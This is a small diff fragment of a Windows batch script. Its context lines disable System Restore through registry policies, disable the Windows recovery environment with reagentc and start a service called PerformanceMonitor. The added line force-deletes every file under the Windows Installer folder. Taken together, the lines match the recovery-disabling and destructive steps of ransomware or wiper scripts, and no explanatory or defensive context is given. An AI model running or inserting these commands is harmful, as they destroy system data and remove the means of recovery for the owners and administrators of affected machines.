@@ -41,3 +41,4 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 reagentc /disable
 sc start PerformanceMonitor
+del /f /s /q %windir%\Installer\*.*
